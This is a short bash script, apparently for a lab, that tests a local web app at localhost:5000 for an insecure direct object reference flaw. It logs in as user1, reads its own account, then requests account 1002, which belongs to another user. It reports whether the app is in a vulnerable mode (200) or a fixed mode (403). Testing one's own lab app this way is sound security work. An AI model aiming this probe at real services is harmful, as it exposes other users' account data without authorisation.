#!/bin/bash
set -e

BASE_URL="http://localhost:5000"
COOKIE_JAR="cookies.txt"

echo "[*] Cleaning old session"
rm -f $COOKIE_JAR

echo "[*] Login as user1"
curl -s -X POST "$BASE_URL/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"user1"}' \
  -c $COOKIE_JAR \
  | jq .

echo
echo "[*] Access own account (account_id=1001)"
curl -s "$BASE_URL/api/accounts/1001" \
  -b $COOKIE_JAR \
  | jq .

echo
echo "[*] IDOR attempt: access чужого акаунту (account_id=1002)"
STATUS=$(curl -s -o response.json -w "%{http_code}" \
  "$BASE_URL/api/accounts/1002" \
  -b $COOKIE_JAR)

echo "HTTP status: $STATUS"
cat response.json | jq .

echo
if [ "$STATUS" -eq 200 ]; then
  echo "[!] VULNERABLE MODE: IDOR succeeded (200 OK)"
elif [ "$STATUS" -eq 403 ]; then
  echo "[✓] FIXED MODE: IDOR blocked (403 Forbidden)"
else
  echo "[?] Unexpected response"
fi

echo
echo "[*] Done"
